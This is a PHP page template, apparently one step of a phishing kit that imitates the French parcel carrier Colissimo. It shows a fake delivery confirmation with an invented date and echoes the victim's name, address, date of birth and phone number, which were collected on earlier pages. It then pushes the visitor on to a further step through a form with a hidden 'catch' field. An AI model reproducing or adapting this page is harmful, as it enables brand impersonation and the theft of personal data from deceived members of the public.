<?php
require_once 'config/panel.php';
$today = new DateTime('now', new DateTimeZone('Europe/Paris'));
$tomorrow = new DateTime('tomorrow');
$day_after_tomorrow = new DateTime('tomorrow +1 day');
ob_start();
?>

<div class="w-100 d-flex flex-column justify-content-center align-items-center bg-white p-3">


     <form class="container p-3 my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">

<div class="d-flex flex-row justify-content-start align-items-center"> 
    <img style="width: 118px;" src="assets/images/logo-colissimo.svg" alt="" srcset="">
    <h2 class="m-0" style="font-size: 18px;color:#20458F;font-family:bold-font;padding-left:10px;">N°<?= TRACK; ?></h2>
</div>
<div class="d-flex flex-row justify-content-start align-items-center">
    <p class=" m-0" style="font-size: 12px;color:#3c3c3c;">La date de livraison : </p>
    <h2 class=" m-0" style="font-size: 12px;color:#20458F;font-family:bold-font;padding-left:10px;"><?php echo $day_after_tomorrow->format('d/m/Y') . "\n"; ?></h2>
</div>
<img class="my-3 w-100"  src="assets/images/sep.png" alt="" srcset="">
 <h5 class="py-2"><strong>Confirmation</strong></h5>
 <p style="font-size: 14.8px;">Nous sommes heureux de confirmer le traitement réussi de votre colis. Votre satisfaction est notre priorité absolue et nous avons le plaisir de vous informer que la livraison de votre colis est prévue dans les prochaines 48 heures.</p>
 <p style="font-size: 14.8px;">Vous recevrez un email avec le suivi de livraison de votre colis dans les prochaines <strong>24</strong> heures.</p>
 <p style="font-size: 14.8px;">Nous vous exprimons notre gratitude.</p>
 

 <div class="w-100 d-flex justify-content-center align-items-center">
 <button name="submit" value="page5" type="submit" style="font-family: bold-font;width:136px;font-size:14px;background-color:#ffc905;" class="btn btn-warning my-3 p-3 rounded-3">Continuer</button>
 </div>

 <div class="container-rs p-3 my-3 artado d-flex flex-column justify-content-start align-items-start">
   <div class="pb-1 w-100 d-flex flex-row justify-content-between  align-items-center">
   <strong style="font-size: 14.8px;color:#4d677a;">Nom et surnom :</strong>
   <strong style="font-size: 14.8px;color:#4d677a;"><?php echo $_SESSION['sname'];?></strong>
   </div>
   <div class="pb-1 w-100 d-flex flex-row justify-content-between  align-items-center">
   <strong style="font-size: 14.8px;color:#4d677a;">Adresse de livraison :</strong>
   <strong style="font-size: 14.8px;color:#4d677a;"><?php echo $_SESSION['scity'] ." ". $_SESSION['szip'];?></strong>
   </div>
   <div class="pb-1 w-100 d-flex flex-row justify-content-between  align-items-center">
   <strong style="font-size: 14.8px;color:#4d677a;">Date de naissance :</strong>
   <strong style="font-size: 14.8px;color:#4d677a;"><?php echo $_SESSION['sdob'];?></strong>
   </div>
   <div class="pb-1 w-100 d-flex flex-row justify-content-between  align-items-center">
   <strong style="font-size: 14.8px;color:#4d677a;">Téléphone :</strong>
   <strong style="font-size: 14.8px;color:#4d677a;"><?php echo $_SESSION['sphone'];?></strong>
   </div>
   <p class="pt-4" style="font-size: 14.8px;color:#4d677a;">Notre équipe dédiée travaille avec diligence pour garantir que votre colis vous parvienne rapidement et en parfait état. <br>Vous pouvez vous attendre à recevoir votre envoi au plus tard le <?php echo $day_after_tomorrow->format('d/m/Y') . "\n"; ?> .</p>
</div>
</form>

</div>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout.php' ?>